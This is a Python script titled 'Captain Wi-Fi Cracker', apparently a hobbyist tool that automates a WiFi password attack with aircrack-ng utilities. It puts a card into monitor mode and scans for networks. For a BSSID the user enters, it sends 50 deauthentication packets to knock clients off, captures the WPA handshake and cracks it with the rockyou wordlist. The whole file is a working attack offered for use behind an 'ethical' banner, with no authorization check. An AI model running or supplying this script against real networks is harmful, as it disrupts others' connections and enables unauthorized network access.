#!/usr/bin/env python3
import subprocess
import re
import os
import time
import sys
import shutil

def display_intro():
    terminal_width = shutil.get_terminal_size().columns  # Get current terminal width
    ascii_art = r"""
    ____            _        _        __        ___       _____ _    ____                _              
   / ___|__ _ _ __ | |_ __ _(_)_ __   \ \      / (_)     |  ___(_)  / ___|_ __ __ _  ___| | _____ _ __  
  | |   / _` | '_ \| __/ _` | | '_ \   \ \ /\ / /| |_____| |_  | | | |   | '__/ _` |/ __| |/ / _ \ '__| 
  | |__| (_| | |_) | || (_| | | | | |   \ V  V / | |_____|  _| | | | |___| | | (_| | (__|   <  __/ |    
   \____\__,_| .__/ \__\__,_|_|_| |_|    \_/\_/  |_|     |_|   |_|  \____|_|  \__,_|\___|_|\_\___|_|    
             |_|                                                                                         
    """

    intro_text = """
                               ############################################################
                               #                  Captain Wi-Fi Cracker                  #
                               #         Ethical WiFi Penetration Testing Tool           #
                               #                      Author: Nandu10                    #
                               #  LinkedIn: https://linkedin.com/in/nandu-krishna-       #
                               ############################################################

                             Hacking is an art — use your skills ethically!
    """

    # Center the ASCII art and text
    print(ascii_art.center(terminal_width))
    print(intro_text.center(terminal_width))



def get_wifi_cards():
    print("[*] Scanning for WiFi cards...")
    result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, text=True)
    cards = re.findall(r'^(\w+)\s+IEEE 802.11', result.stdout, re.M)
    if not cards:
        print("[!] No compatible WiFi cards auto-detected.")
        cards = ['wlan0']  # Manual fallback
    return cards

def pick_card(cards):
    print("\nAvailable WiFi Cards:")
    for i, card in enumerate(cards):
        print(f"{i}: {card}")
    while True:
        try:
            choice = int(input("Choose your WiFi card: "))
            if 0 <= choice < len(cards):
                return cards[choice]
        except ValueError:
            pass
        print("Invalid selection. Try again.")

def start_monitor_mode(card):
    print(f"[*] Enabling monitor mode on {card}...")
    subprocess.run(['airmon-ng', 'start', card])
    time.sleep(2)

    out = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, text=True).stdout
    matches = re.findall(r'^(\w+).*Mode:Monitor', out, re.M)

    if matches:
        print(f"[+] Monitor mode enabled on: {matches[0]}")
        return matches[0]
    else:
        print("[-] Failed to enter monitor mode.")
        sys.exit(1)

def scan_wifi(mon_card):
    print(f"[*] Starting scan on {mon_card}. Press Ctrl+C to stop.")
    try:
        subprocess.run(['airodump-ng', mon_card])
    except KeyboardInterrupt:
        print("\n[*] Scan interrupted.")

def get_handshake(mon_card, bssid, channel):
    folder = "handshakes"
    os.makedirs(folder, exist_ok=True)
    savefile = f"{folder}/{bssid.replace(':', '-')}"

    print("[*] Capturing handshake...")
    proc = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', savefile, mon_card])

    time.sleep(5)
    print("[*] Sending deauth packets...")
    # Increased deauth packets to ensure the client reconnects
    subprocess.run(['aireplay-ng', '--deauth', '50', '-a', bssid, mon_card], stdout=subprocess.DEVNULL)

    try:
        # Increased the capture time to 60 seconds to ensure enough time for the handshake
        time.sleep(60)
    except KeyboardInterrupt:
        print("[*] Early stop requested.")

    proc.terminate()
    capfile = savefile + "-01.cap"
    print(f"[+] Handshake saved to {capfile}")
    return capfile

def ensure_wordlist_exists(path):
    if os.path.isfile(path):
        return path
    elif os.path.isfile(path + ".gz"):
        print("[*] Wordlist is gzipped. Unzipping now...")
        subprocess.run(['gunzip', path + ".gz"])
        return path
    else:
        return None

def crack_handshake(capfile):
    print("\nChoose a wordlist option:")
    print("1. Use default rockyou.txt")
    print("2. Enter custom path")
    choice = input("Select [1 or 2]: ").strip()
    if choice == "1":
        wordlist = "/usr/share/wordlists/rockyou.txt"
    elif choice == "2":
        wordlist = input("Enter full path to your wordlist: ").strip()
    else:
        print("[-] Invalid option. Using default rockyou.txt")
        wordlist = "/usr/share/wordlists/rockyou.txt"

    wordlist = ensure_wordlist_exists(wordlist)
    if not wordlist or not os.path.isfile(wordlist):
        print("[-] Wordlist file not found!")
        return

    print("[*] Cracking in progress...")
    subprocess.run(['aircrack-ng', '-w', wordlist, capfile])

def main():
    if os.geteuid() != 0:
        print("[-] Run this script as root.")
        sys.exit(1)

    display_intro()
    cards = get_wifi_cards()

    card = pick_card(cards)
    mon_card = start_monitor_mode(card)
    scan_wifi(mon_card)

    bssid = input("Enter target BSSID: ").strip()
    channel = input("Enter channel: ").strip()

    capfile = get_handshake(mon_card, bssid, channel)
    crack_handshake(capfile)

if __name__ == "__main__":
    main()
